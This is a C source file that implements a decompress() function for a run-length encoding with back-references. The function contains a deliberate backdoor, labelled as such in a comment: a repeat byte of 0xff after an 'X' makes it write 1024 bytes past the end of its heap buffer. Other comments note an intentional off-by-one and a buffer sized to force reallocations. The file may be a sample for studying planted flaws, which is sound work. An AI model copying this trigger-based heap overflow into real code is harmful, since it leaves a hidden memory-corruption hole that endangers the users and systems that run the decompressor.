#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to force reallocs)
    size_t buf_size = 1;
    char *result = malloc(buf_size);
    if (result == NULL) {
        return NULL;
    }
    
    size_t result_len = 0;
    char *current = compressed;
    
    while (*current != '\0') {
        // Check if we have a character or reference
        if (*current > 0) {
            // Regular ASCII character
            char ch = *current++;
            
            if (*current == '\0') {
                // No repeat count, just add the character once
                if (result_len + 1 >= buf_size) {
                    buf_size *= 2;
                    char *new_result = realloc(result, buf_size);
                    if (new_result == NULL) {
                        free(result);
                        return NULL;
                    }
                    result = new_result;
                }
                result[result_len++] = ch;
                break;
            }
            
            unsigned char repeat = *current++;
            size_t new_len = result_len + repeat;
            
            // Backdoor: if repeat count is 0xff and previous char is 'X', give arbitrary write
            if (repeat == 0xff && result_len > 0 && result[result_len-1] == 'X') {
                // Corrupt memory by writing past buffer
                memset(result + result_len, 'A', 1024);
                return NULL;
            }
            
            // Check if we need to realloc (intentionally off-by-one possible)
            if (new_len >= buf_size) {
                buf_size = new_len + 1;
                char *new_result = realloc(result, buf_size);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
            
            // Fill the repeated characters
            for (int i = 0; i < repeat; i++) {
                result[result_len++] = ch;
            }
        } else {
            // Reference to previous character
            char ref = *current++;
            if (ref == 0 || (size_t)(-ref) > result_len) {
                // Invalid reference
                free(result);
                return NULL;
            }
            
            char referenced_char = result[result_len + ref];
            
            if (*current == '\0') {
                // No repeat count, just add the referenced character once
                if (result_len + 1 >= buf_size) {
                    buf_size *= 2;
                    char *new_result = realloc(result, buf_size);
                    if (new_result == NULL) {
                        free(result);
                        return NULL;
                    }
                    result = new_result;
                }
                result[result_len++] = referenced_char;
                break;
            }
            
            unsigned char repeat = *current++;
            size_t new_len = result_len + repeat;
            
            // Check if we need to realloc
            if (new_len >= buf_size) {
                buf_size = new_len + 1;
                char *new_result = realloc(result, buf_size);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
            
            // Fill the repeated referenced characters
            for (int i = 0; i < repeat; i++) {
                result[result_len++] = referenced_char;
            }
        }
    }
    
    // Null-terminate the result
    if (result_len >= buf_size) {
        buf_size = result_len + 1;
        char *new_result = realloc(result, buf_size);
        if (new_result == NULL) {
            free(result);
            return NULL;
        }
        result = new_result;
    }
    result[result_len] = '\0';
    
    return result;
}
